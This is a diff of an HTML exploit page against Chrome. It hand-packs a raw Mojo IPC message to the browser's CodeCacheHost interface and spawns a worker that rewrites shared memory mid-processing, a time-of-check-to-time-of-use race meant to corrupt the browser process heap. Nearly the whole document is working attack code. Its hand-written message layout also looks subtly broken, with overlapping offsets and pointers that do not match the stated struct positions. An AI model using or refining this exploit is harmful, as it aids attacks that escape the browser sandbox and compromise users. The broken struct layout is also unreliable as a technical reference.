@@ -1,27 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CodeCacheHost BigBuffer TOCTOU</title>
+    <title>CodeCacheHost Raw IPC TOCTOU</title>
 </head>
 <body>
-    <h1>Chrome Windows TOCTOU Trigger</h1>
-    <button id="pwn">Trigger Heap Corruption</button>
-
-    <!-- Load the patched bindings -->
-    <script src="code_cache.mojom.js"></script>
+    <h1>Raw Mojo TOCTOU Exploit</h1>
+    <button id="pwn">Fire Raw Payload</button>
 
     <script>
         async function pwnBrowser() {
-            console.log("[*] Initializing Mojo connections...");
+            console.log("[*] Creating raw Mojo Message Pipe...");
 
-            // 1. Grab the interface from the namespace your file created
-            const CodeCacheHostPtr = blink.mojom.CodeCacheHostPtr;
-            const CodeCacheType = blink.mojom.CodeCacheType;
-
-            // 2. Bind to the Browser Process Interface
-            const codeCacheHost = new CodeCacheHostPtr();
-            Mojo.bindInterface('blink.mojom.CodeCacheHost', 
-                               mojo.makeRequest(codeCacheHost).handle);
+            // 1. Create a raw IPC pipe
+            const pipe = Mojo.createMessagePipe();
+            
+            // 2. Bind the Browser process to our pipe
+            Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
 
             // 3. Allocate the Malicious Shared Memory (100KB)
             const bufferSize = 100 * 1024;
@@ -29,42 +23,71 @@
             const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
             const view = new DataView(mapping.buffer);
 
-            // 4. Write a "Safe" Dummy Header (Size = 0x50)
+            // Write a "Safe" Dummy V8 Header
             view.setUint32(0, 0x13371337, true); 
             view.setUint32(4, 0x50, true);  
 
             console.log("[*] Shared Memory ready. Spawning mutator...");
 
-            // 5. Spawn the Mutator Worker to race the Browser
+            // 4. Spawn the Mutator Worker to race the Browser
             const mutator = new Worker('mutator.js');
             mutator.postMessage({ buffer: mapping.buffer }, [mapping.buffer]);
 
-            // 6. Construct the Raw Structs manually (since we deleted the deps)
-            // url.mojom.Url
-            const fakeUrl = { url: "https://victim.com/" }; 
+            console.log("[*] Forging C++ Structs in memory...");
+
+            // 5. PACK THE RAW IPC MESSAGE (128 Bytes Total)
+            const msg = new ArrayBuffer(128);
+            const msgView = new DataView(msg);
+
+            // --- MOJO HEADER (16 Bytes) ---
+            msgView.setUint32(0, 128, true); // Total Message Size
+            msgView.setUint32(4, 0, true);   // Version
+            msgView.setUint32(8, 0, true);   // Interface ID
+            msgView.setUint32(12, 1, true);  // Message ID (1 = DidGenerateCacheableMetadata)
+
+            // --- PARAMS STRUCT (40 Bytes, starts at offset 16) ---
+            msgView.setUint32(16, 40, true); // Struct size
+            msgView.setUint32(20, 0, true);  // Version
+            msgView.setUint32(24, 0, true);  // CodeCacheType (0 = Javascript)
+            msgView.setUint32(28, 0, true);  // Padding
+            msgView.setBigUint64(32, 24n, true); // Pointer to URL struct (Relative offset)
+            msgView.setBigUint64(40, 56n, true); // Pointer to Time struct (Relative offset)
             
-            // mojo_base.mojom.Time
-            const fakeTime = { internalValue: 0n }; 
-            
-            // mojo_base.mojom.BigBuffer (Union)
-            const bigBufferData = {
-                sharedMemory: {
-                    bufferHandle: sharedBuffer.handle,
-                    size: bufferSize
-                }
-            };
+            // BigBuffer Union (Inline, 16 Bytes)
+            msgView.setUint32(48, 16, true); // Union size
+            msgView.setUint32(52, 1, true);  // Union tag (1 = shared_memory)
+            msgView.setBigUint64(56, 56n, true); // Pointer to SharedMemoryRegion struct
 
-            console.log("[*] Firing IPC Message...");
+            // --- URL STRUCT (16 Bytes, starts at offset 56) ---
+            msgView.setUint32(56, 16, true); // Struct size
+            msgView.setUint32(60, 0, true);  // Version
+            msgView.setBigUint64(64, 8n, true); // Pointer to String data
 
-            // 7. FIRE THE IPC MESSAGE
-            codeCacheHost.didGenerateCacheableMetadata(
-                CodeCacheType.kJavascript, 
-                fakeUrl, 
-                fakeTime, 
-                bigBufferData
-            );
+            // --- STRING DATA (24 Bytes, starts at offset 72) ---
+            msgView.setUint32(72, 24, true); // Array size (8 byte header + 12 chars + padding)
+            msgView.setUint32(76, 12, true); // Number of characters
+            const urlStr = "http://a.com"; 
+            for(let i = 0; i < 12; i++) {
+                msgView.setUint8(80 + i, urlStr.charCodeAt(i));
+            }
 
-            console.log("[+] IPC sent! If the race hits, the browser process will crash.");
+            // --- TIME STRUCT (16 Bytes, starts at offset 96) ---
+            msgView.setUint32(96, 16, true); // Struct size
+            msgView.setUint32(100, 0, true); // Version
+            msgView.setBigUint64(104, 0n, true); // internal_value (0)
+
+            // --- SHARED MEMORY REGION STRUCT (16 Bytes, starts at offset 112) ---
+            msgView.setUint32(112, 16, true); // Struct size
+            msgView.setUint32(116, 0, true);  // Version
+            msgView.setUint32(120, 0, true);  // Handle Index (Points to the 0th element in our handle array)
+            msgView.setUint32(124, bufferSize, true); // Buffer Size
+
+            console.log("[*] Firing Raw IPC Payload...");
+
+            // 6. FIRE THE MESSAGE directly down the pipe
+            pipe.handle0.writeMessage(msg, [sharedBuffer.handle]);
+
+            console.log("[+] Payload Sent. If the race hits, Chrome will SIGSEGV.");
         }
 
         document.getElementById('pwn').onclick = pwnBrowser;
